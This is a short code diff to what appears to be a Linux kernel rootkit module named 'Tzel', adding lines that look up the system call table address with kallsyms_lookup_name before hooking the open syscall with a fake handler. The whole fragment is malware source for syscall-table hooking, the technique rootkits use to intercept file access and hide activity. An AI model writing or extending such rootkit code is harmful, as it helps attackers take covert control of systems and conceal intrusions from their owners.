@@ -58,6 +58,11 @@ asmlinkage long sys_open_fake(unsigned int fd)
 
 static int __init init_rootkit(void)
 {
+    printk(KERN_ALERT "Loading Tzel.\n");
+
+    sys_call_table = kallsyms_lookup_name("sys_call_table");
+    printk(KERN_ALERT "sys_call_table address: %lx\n", sys_call_table);
+
     hook_syscall(__NR_open, (unsigned long)sys_open_fake);
 
     return 0;
